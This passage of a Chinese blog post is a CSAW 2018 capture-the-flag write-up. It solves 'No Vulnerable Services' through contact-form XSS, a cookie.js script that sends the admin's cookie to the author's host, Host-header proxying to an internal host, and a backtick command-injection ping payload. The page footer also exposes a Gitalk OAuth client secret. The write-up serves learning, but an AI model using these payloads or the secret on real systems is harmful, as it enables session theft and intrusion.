document.getElementById(&#39;report&#39;).onclick = () =&gt; {
if (hidden) {
  document.getElementById(&quot;captcha&quot;).parentElement.style.display=&#39;block&#39;;
  document.getElementById(&#39;report&#39;).disabled = true;
  hidden = false;
  return;
}
fetch(&#39;/api/report&#39;,{
method: &#39;POST&#39;,
body: JSON.stringify({token:token})
}).then(r=&gt;r.json()).then(j=&gt;{
if (j.success) {
// The admin is on her way to check the page
alert(&quot;Neo... nobody has ever done this before.&quot;);
alert(&quot;That&#39;s why it&#39;s going to work.&quot;);
} else {
alert(&quot;Dodge this.&quot;);
}
});
}
});
</code></pre><p>一段时间后出现如下</p>
<pre><code>Failed to load http://188.xxx.xxx.xxx/cdn/main.mst: 
No &#39;Access-Control-Allow-Origin&#39; header is present on the requested resource. 
Origin &#39;http://app.hm.vulnerable.services&#39; is therefore not allowed access. 
If an opaque response serves your needs, set the request&#39;s mode to &#39;no-cors&#39; to fetch the resource with CORS disabled.
(index):1 Uncaught (in promise) TypeError: Failed to fetch
Promise.then (async)
(anonymous) @ blob:http://app.hm.vulnerable.services/2a2a5c2b-f0cb-4879-b216-7b408b57cc8d:16
</code></pre><p>意思就是说我们服务器的返回包需要有Access-Control-Allow-Origin这个字段，这样就很简单了，直接搜索如何返回头部添加，</p>
<p>默认的apache2好像稍微麻烦一点。</p>
<p>直接搜索头部加CORS的方法,使用如下python代码</p>
<pre><code>#!/usr/bin/env python
# -*- coding: utf-8 -*-

try:
# Python 3
from http.server import HTTPServer, SimpleHTTPRequestHandler, test as test_orig
import sys
def test (*args):
test_orig(*args, port=int(sys.argv[1]) if len(sys.argv) &gt; 1 else 8000)
except ImportError: # Python 2
from BaseHTTPServer import HTTPServer, test
from SimpleHTTPServer import SimpleHTTPRequestHandler

class CORSRequestHandler (SimpleHTTPRequestHandler):
def end_headers (self):
self.send_header(&#39;Access-Control-Allow-Origin&#39;, &#39;*&#39;)
SimpleHTTPRequestHandler.end_headers(self)

if __name__ == &#39;__main__&#39;:
test(CORSRequestHandler, HTTPServer)
</code></pre><p>这里有一个坑,只有burp开着代理本地访问网页才能成功，如果走代理的话是访问不到的。</p>
<p>访问即得flag可以稍微等待一哈在访问题目</p>
<p>这个题做了好久，不过涨见识了,脑子是个好东西…</p>
<h3 id="No-Vulnerable-Services"><a href="#No-Vulnerable-Services" class="headerlink" title="No Vulnerable Services"></a>No Vulnerable Services</h3><pre><code>No Vulnerable Services is a company founded on the idea that all websites should be secure. We use the latest web security standards, and provide complementary pentests of all customer sites with our exclusive NoPwn® guarantee.
Be #unhackable.
http://no.vulnerable.services/
</code></pre><p>正常打开界面，主界面返回包的头部如下</p>
<pre><code>HTTP/1.1 200 OK
Date: Wed, 03 Oct 2018 01:48:26 GMT
Server: Apache/2.4.29 (Ubuntu)
Vary: Accept-Encoding
X-Served-By: d8a50228.ip.no.vulnerable.services
Content-Security-Policy: default-src &#39;none&#39;; script-src *.no.vulnerable.services https://www.google.com/ https://www.gstatic.com/; style-src *.no.vulnerable.services https://fonts.googleapis.com/ &#39;unsafe-inline&#39;; img-src *.no.vulnerable.services; font-src *.no.vulnerable.services https://fonts.gstatic.com/; frame-src https://www.google.com/
Content-Length: 6943
Connection: close
Content-Type: text/html; charset=UTF-8
</code></pre><p>关注点在两个上</p>
<pre><code>X-Served-By: d8a50228.ip.no.vulnerable.services
Content-Security-Policy:······
</code></pre><p>fuzz一波可以发现这里指代的应该是ip,我在这里解密</p>
<pre><code>d8a50228-&gt;216.165.2.40
</code></pre><p>尝试将这里改为我服务器的ip</p>
<pre><code>http://bcxxxxxxx.ip.no.vulnerable.services/
</code></pre><p>发现可以正常访问,显示了我服务器的主页。</p>
<p>再来看看CSP</p>
<p>Content-Security-Policy(CSP)的东西比较多，直接采用<a href="https://csp-evaluator.withgoogle.com/" target="_blank" rel="noopener">谷歌的CSP检测工具检测</a></p>
<p>检测出如下问题</p>
<pre><code>High severity finding
 *error*
---
**script-src** 
*   Host whitelists can frequently be bypassed. Consider using &#39;strict-dynamic&#39; in combination with CSP nonces or hashes.
------
*.no.vulnerable.services
*   No bypass found; make sure that this URL doesn&#39;t serve JSONP replies or Angular libraries.
-------
https://www.google.com/
*   www.google.com is known to host JSONP endpoints which allow to bypass this CSP.
-------
https://www.gstatic.com/
*   www.gstatic.com is known to host Angular libraries which allow to bypass this CSP.
*   
</code></pre><p>只有一个可以与网站交互的地方</p>
<pre><code>Get in touch
Give us your email address and a description of your company and we&#39;ll reach out when we have capacity.

[Your Email Address]

[Tell us about your company]

(Get Started)
</code></pre><p>如何使题目访问到我们的服务器就是一个值得思考的问题，最终采用如下方式</p>
<pre><code>admin@qq.com
&lt;script type=&quot;text/javascript&quot; src=&quot;//bcxxxxx.ip.no.vulnerable.services/cookie.js&quot;&gt;&lt;/script&gt;
</code></pre><p>为了方便，这里采用一个简易的python服务器</p>
<pre><code>try:
# Python 3
from http.server import HTTPServer, SimpleHTTPRequestHandler, test as test_orig
import sys
def test (*args):
test_orig(*args, port=int(sys.argv[1]) if len(sys.argv) &gt; 1 else 8000)
except ImportError: # Python 2
from BaseHTTPServer import HTTPServer, test
from SimpleHTTPServer import SimpleHTTPRequestHandler


class MyHandler(SimpleHTTPRequestHandler):
def do_GET(self):
print(self.headers)
SimpleHTTPRequestHandler.do_GET(self)

if __name__ == &#39;__main__&#39;:
test(MyHandler, HTTPServer)
</code></pre><p>用来获取访问的头部，同时在服务器上放置如下脚本<br><strong>cookie.js</strong></p>
<pre><code>var img = document.createElement(&quot;img&quot;);
img.src = &quot;http://bcxxxxxx.ip.no.vulnerable.services/?cookie=&quot; + encodeURI(document.cookie);
document.body.appendChild(img);
</code></pre><p>这里有一个坑点，就是得需要进行谷歌的人机验证，否则无法正常传输数据到网站那边，应该得fu强成功访问后，得到如下信息</p>
<pre><code>Thank you
We&#39;ll review your application shortly and reach out when we have capacity.
</code></pre><p>同时服务器接收了如下信息</p>
<pre><code> 216.165.2.40 - - [03/Oct/2018 12:33:56] &quot;GET /cookie.js HTTP/1.1&quot; 200 -
Host: bcxxxxxx.ip.no.vulnerable.services
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/69.0.3497.81 HeadlessChrome/69.0.3497.81 Safari/537.36
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Referer: http://admin.no.vulnerable.services/review.php?id=2652
Accept-Encoding: gzip, deflate

216.165.2.40 - - [03/Oct/2018 12:33:57] &quot;GET /?cookie=PHPSESSID=k0qfm8ptanuevpbu0shsjmohc9 HTTP/1.1&quot; 200 -
</code></pre><p>在这里我们可以得到</p>
<pre><code>Safari浏览器
admin.no.vulnerable.services/review.php?id=2652
admin的cookie=PHPSESSID=k0qfm8ptanuevpbu0shsjmohc9
</code></pre><p>使用这个cookie访问<code>admin.no.vulnerable.services</code></p>
<pre><code>&lt;html&gt;
  &lt;head&gt;
&lt;title&gt;NVS INTERNAL - Admin&lt;/title&gt;
  &lt;/head&gt;
  &lt;body&gt;
&lt;p&gt;Current Visitors: 500&lt;/p&gt;
&lt;p&gt;Quick links:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;//support.no.vulnerable.services&quot;&gt;Support&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;lb.php&quot;&gt;Load Balancers - BETA&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre><p><strong>lb.php</strong></p>
<pre><code>Beta Loadbalancer Stats
Online - HealthyOnline - Unhealthy  Offline
216.165.2.4110.20.0.10
10.20.0.11
10.20.0.12
</code></pre><p>这里通过ip的方式大致推断216.165.2.41是一个代理服务器，直接访问是</p>
<pre><code>404 Not Found
nginx/1.14.0 (Ubuntu)
</code></pre><p><code>support.no.vulnerable.services</code>无法访问，猜测需要获取ip</p>
<pre><code>ping support.no.vulnerable.services
正在 Ping support.no.vulnerable.services [172.16.2.5] 具有 32 字节的数据:
</code></pre><p>将ip转换为为16进制继续访问</p>
<pre><code>http://ac100205.no.vulnerable.services/
无法访问此网站
网址为 http://ac100205.no.vulnerable.services/ 的网页可能暂时无法连接，或者它已永久性地移动到了新网址。
</code></pre><p>然后就涉及到知识盲区了，看wp之后，震惊，没想到burp还有这种功能</p>
<p>之前的理解是Target就是Host，不过这里学到了，具体什么情况只可意会不可言传</p>
<pre><code>Target:support.no.vulnerable.services

GET / HTTP/1.1
Host: support.no.vulnerable.services

GET / HTTP/1.1
Host: ac100205.ip.no.vulnerable.services
</code></pre><p>什么也没有返回</p>
<p>Target:<a href="http://216.165.2.41:80" target="_blank" rel="noopener">http://216.165.2.41:80</a></p>
<pre><code>GET / HTTP/1.1
Host: 216.165.2.41
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Language: zh,zh-CN;q=0.9,en;q=0.8,zh-TW;q=0.7
Accept-Encoding: gzip, deflate
Connection: close
--------------
response
--------------
&lt;html&gt;
&lt;head&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt;
&lt;body bgcolor=&quot;white&quot;&gt;
&lt;center&gt;&lt;h1&gt;404 Not Found&lt;/h1&gt;&lt;/center&gt;
&lt;hr&gt;&lt;center&gt;nginx/1.14.0 (Ubuntu)&lt;/center&gt;
&lt;/body&gt;
&lt;/html&gt;



GET / HTTP/1.1
Host:support.no.vulnerable.services
·······
--------------
reponse
--------------
Hacking detected! Denied attempt to proxy to a NVS internal hostname. Your IP has been logged.



GET / HTTP/1.1
Host: ac100205.ip.no.vulnerable.services
······
--------------
response
--------------
&lt;html&gt;
&lt;head&gt;
&lt;title&gt;NVS INTERNAL - Support&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;h1&gt;NVS Support&lt;/h1&gt;
&lt;h3&gt;General Debugging Steps&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;Tell the customer to turn it off and back on again.&lt;/li&gt;
&lt;li&gt;Blame the customer for making a change.&lt;/li&gt;
&lt;li&gt;Use the tools below to check for networking issues.&lt;/li&gt;
&lt;/ol&gt;
&lt;hr/&gt;
&lt;h3&gt;Tools&lt;/h3&gt;
&lt;p&gt;Ping&lt;/p&gt;
&lt;form action=&quot;ping.php&quot; method=&quot;get&quot;&gt;
&lt;input type=&quot;text&quot; name=&quot;dest&quot; placeholder=&quot;IP or hostname&quot; /&gt;
&lt;input type=&quot;submit&quot; value=&quot;Ping&quot; /&gt;
&lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre><p>刚开始测试的时候主界面没有出来，后来就好了</p>
<p>最后的paylaod</p>
<pre><code>GET /ping.php?dest=127.0.0.1`cat%20flag.txt` HTTP/1.1
Host: ac100205.ip.no.vulnerable.services
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Language: zh,zh-CN;q=0.9,en;q=0.8,zh-TW;q=0.7
Accept-Encoding: gzip, deflate
Connection: close
</code></pre><h3 id="对题目的一点点思考"><a href="#对题目的一点点思考" class="headerlink" title="对题目的一点点思考"></a>对题目的一点点思考</h3><p>这里题目调用谷歌的api，而且有相应的域名，所以理论上部分信息应该是可以被谷歌搜索到的(纯属个人思考，有问题欢迎大师傅指出，多多交流)</p>
<pre><code>site:*.no.vulnerable.services
</code></pre><p>可以直接搜索到<a href="http://admin.no.vulnerable.services/login.php" target="_blank" rel="noopener">http://admin.no.vulnerable.services/login.php</a>，不过需要登陆，但是提供了一些信息</p>
<pre><code>&lt;html&gt;
&lt;head&gt;
&lt;title&gt;NVS INTERNAL - Login&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;form action=&quot;login.php&quot; method=&quot;POST&quot;&gt;
&lt;input type=&quot;text&quot; name=&quot;user&quot; /&gt;
&lt;input type=&quot;password&quot; name=&quot;password&quot; /&gt;
&lt;input type=&quot;submit&quot; value=&quot;Login&quot; /&gt;
&lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre><p>而且看到子域名类的题目应该直接采用Seay的Layer子域名挖掘机</p>
<pre><code>admin---&gt;216.165.2.40
support---&gt;172.16.2.5---&gt;172.16.2.5 服务器响应时间过长.(说明存在,而且应该只能由类似域名访问）
static---&gt;216.165.2.40---&gt;Forbidden
······(这里就不跑了，应该还有很多,默认字典十分强大+爆破组合)
</code></pre><p>这道题目可以直接收集到的域名和对应的ip地址，会方便很多，直接提供一个大局观的思考,更加方便的做题。</p>
<p>参考资料：</p>
<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20injection" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20injection</a></p>
<p><a href="http://www.ruanyifeng.com/blog/2014/05/oauth_2_0.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2014/05/oauth_2_0.html</a></p>
<p><a href="https://lud1161.github.io/posts/hacker-movie-club-csaw-quals-2018/" target="_blank" rel="noopener">https://lud1161.github.io/posts/hacker-movie-club-csaw-quals-2018/</a></p>
<p><a href="https://cloud.tencent.com/developer/section/1190030" target="_blank" rel="noopener">https://cloud.tencent.com/developer/section/1190030</a></p>
<p><a href="http://drops.xmd5.com/static/drops/papers-1383.html" target="_blank" rel="noopener">http://drops.xmd5.com/static/drops/papers-1383.html</a></p>
<p><a href="https://delcoding.github.io/2018/09/csaw-writeup2/" target="_blank" rel="noopener">https://delcoding.github.io/2018/09/csaw-writeup2/</a></p>

					
				</div>
			</div>
		</article>

		<ul class="am-pagination">
    
    	<li class="am-pagination-prev">
   		<a class="pull-left" href="/2018/11/26/PTA刷题——到底是不是太胖了/" title="PTA刷题——到底是不是太胖了">
      		&laquo; 上一篇
		</a>
		</li>
	
	
		<li class="am-pagination-next">
		<a class="pull-right" href="/2018/11/24/2018Web测试大赛全国总决赛部分Writeup/" title="2018Web测试大赛全国总决赛部分Writeup">
			下一篇 &raquo;
		</a>
		</li>
	 
 </ul>
        

		<div class="theme-annie-comment-button-container">
	<button id="annie-comment-button" class="theme-annie-comment-button" onclick="Annie_Comment()">
		加载评论
		<!--加载评论-->
	</button>
</div>

<div id="annie-comment-container" class="theme-annie-comment-main-container">

	
		
			<!-- comment gitalk -->
			<!-- show gitalk comment -->

  <div id="gitalk-container"></div>


<!-- gitalk`s css & js -->
<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
<link rel="stylesheet" href="/css/comment.css">
<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>

<script type="text/javascript">
	//thanks O-R
	//https://github.com/gitalk/gitalk/issues/102#issuecomment-382970552
	//去除尾部匹配正则数组的字符串  
	//remove redundant characters
	String.prototype.trimEnd = function(regStr) {
		var result = this;
		if(regStr == undefined || regStr == null || regStr == "") {
			return result;
		}
		var array = regStr.split(',');

		if(array.length > 0) {

			var c = array.shift();
			var str = this;
			var i = str.length;
			var rg = new RegExp(c);
			var matchArr = str.match(rg);

			if(matchArr != undefined && matchArr != null && matchArr.length > 0) {
				var matchStr = matchArr[0].replace(/\\/g, "\\\\").replace(/\*/g, "\\*")
					.replace(/\+/g, "\\+").replace(/\|/g, "\\|")
					.replace(/\{/g, "\\{").replace(/\}/g, "\\}")
					.replace(/\(/g, "\\(").replace(/\)/g, "\\)")
					.replace(/\^/g, "\\^").replace(/\$/g, "\\$")
					.replace(/\[/g, "\\[").replace(/\]/g, "\\]")
					.replace(/\?/g, "\\?").replace(/\,/g, "\\,")
					.replace(/\./g, "\\.").replace(/\&/g, "\\&");
				matchStr = matchStr + '$';
				result = str.replace(new RegExp(matchStr), "");
			}

			if(array.length > 0) {
				return result.trimEnd(array.join())
			} else {
				return result;
			}
		}
	};

	//create gitalk
	var gitalk = new Gitalk({
		clientID: '74a83cc9b15a1cf53e10',
		clientSecret: 'b62af8b132c33178adcb0098e2315806e2e57cae',
		//id: window.location.pathname,
		// id: (window.location.pathname).split("/").pop().substring(0, 49),
		id: md5(location.href.trimEnd('#.*$,\\?.*$,index.html$')),
		repo: 'Annie-Gitalk',
		owner: 'miraitowa',
		admin: 'miraitowa',
		distractionFreeMode: 'true',
	})
	gitalk.render('gitalk-container');
</script>
		
	

</div>

<script type="text/javascript">
	/* Show Comment */
	var Annie_Comment = function() {
		function Show_Hidden(obj) {
			obj.style.display = 'block';
		}
		
		//var obutton = $('#annie-comment-button');
		//var obutton = $('#annie-comment-container');
		var obutton = document.getElementById("annie-comment-button" || "0");
		var odiv = document.getElementById("annie-comment-container");
		if( 'obutton' ) {
			obutton.onclick = function() {
				Show_Hidden(odiv);
				$("#annie-comment-button").css("display", 'none');
				return false;
			}
		}
	};

	(function Annie_Init() {
		Annie_Comment();
	})();
</script>
		
		<!--
	时间：2018-09-24
	描述：The TOC module refers to 'https://github.com/codefine/hexo-theme-mellow', include toc.ejs、toc.js、toc.css. All rights reserved by codefine. 
-->

	
		<aside class="post-widget">
			<nav class="post-toc-wrap" id="post-toc">
				
					<strong>文章目录</strong>
				
				
				<!--toc(post.content)-->
				<ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#前言"><span class="post-toc-text">前言</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Ldab"><span class="post-toc-text">Ldab</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#SSO"><span class="post-toc-text">SSO</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Hacker-Movie-Club"><span class="post-toc-text">Hacker Movie Club</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#No-Vulnerable-Services"><span class="post-toc-text">No Vulnerable Services</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#对题目的一点点思考"><span class="post-toc-text">对题目的一点点思考</span></a></li></ol></li></ol>
			</nav>
			<div class="post-toc-bar"><div>
		</div></div></aside>
	

	</div>
</div>
		</div>
		</main>
		
		<!--footer-->
		<footer>
	<div class="blog-text-center">
		<div class="theme-annie-social">
				
				
					<a href="https://github.com/miraitowa" title="Github" target="_blank"><i class="fa fa-github"></i>&nbsp;</a>
					
				
				
					<a href="https://miraitowa.github.io/about/" title="Email" target="_blank"><i class="fa fa-envelope-o"></i>&nbsp;</a>
					
					
						
				
		</div>
	</div>

	<div class="blog-text-center">
		<div class="theme-annie-copyright">
			
				&copy; 2018, content by miraitowa. All Rights Reserved. 			   
			
		</div>
	</div>

	<div class="blog-text-center">
		<div class="theme-annie-copyright">
			<a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> Theme <a href="https://github.com/Sariay/hexo-theme-Annie" title="Annie" target="_blank" rel="noopener">Annie</a> by Sariay.		
		</div>
	</div>
</footer>
		<!-- <script src="http://code.jquery.com/jquery-2.1.1.min.js" type="text/javascript"></script> -->

<script>
	window.jQuery || document.write('<script src="/js/jquery-2.1.1.min.js"><\/script>')
</script>

<style>
	.motto {
		color: #000000;
		font-size: 20px;
		margin: 100px 25% 0;
		width: 50%;
		line-height: 1.4;
		font-family:"KaiTi", "STXingkai", "Source Sans Pro", "Segoe UI", "Lucida Grande", Helvetica, Arial, "Microsoft YaHei", FreeSans, Arimo, "Droid Sans", "wenquanyi micro hei", "Hiragino Sans GB", "Hiragino Sans GB W3", FontAwesome, sans-serif;
		text-align: center;
	}
	@media(max-width: 890px) {
		.motto {	
			margin: 100px 10% 0;
			width: 80%;
		}
	}
	@media(max-width: 890px) {
		.motto {
			margin: 100px 5% 0;
			width: 90%;
		}
	}
</style>


	<script src="/js/motto.js"></script>
	<script type="text/javascript">
		$(".motto").html(getMingYanContent());
	</script>	







	<script type="text/javascript" src="/js/toc.js"></script>


<script type="text/javascript" src="/js/main.js"></script>

<script type="text/javascript">
	//generate a random img that pre_name 'from 0 to 110'
	var random_bg = Math.floor(Math.random() * 109 + 1);

	//var bg = 'url(/img/random/' + random_bg + '.jpg)';		
	var bg = 'url(https://miraitowa.github.io/Random-img/' + random_bg + '.jpg)';

	$("#header-bg-2").css("background-image", bg);
</script>
		
		<!--back to top-->
        <style type="text/css">
	#totop {
		background: white;
		border-radius: 50%;
		position: fixed;
		right: 5.4%;
		bottom: 80px;
		cursor: pointer;
	}
	
	#totop a {
		color: #474747;
		background-color: transparent;
		padding: 10px;
		text-decoration: none;
	}
	
	@media(max-width:512px) {
		#totop {
			display: none;
			visibility: hidden;
		}
	}
</style>


	<div id="totop">
  		<a href="javascript:;" class="fa fa-arrow-up"></a>
	</div>

	</body>
	</html>

